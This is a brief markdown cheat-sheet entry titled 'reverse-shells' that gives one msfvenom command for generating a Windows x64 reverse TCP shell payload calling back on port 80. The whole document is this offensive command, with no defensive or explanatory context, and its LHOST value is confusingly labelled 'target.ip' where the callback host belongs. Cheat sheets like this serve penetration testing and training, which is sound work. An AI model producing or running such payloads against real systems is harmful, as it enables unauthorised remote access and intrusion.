# reverse-shells

## using msfvenom

```text
msfvenom -p windows/shell/reverse_tcp LHOST=target.ip LPORT=80 --platform windows -a x64
```

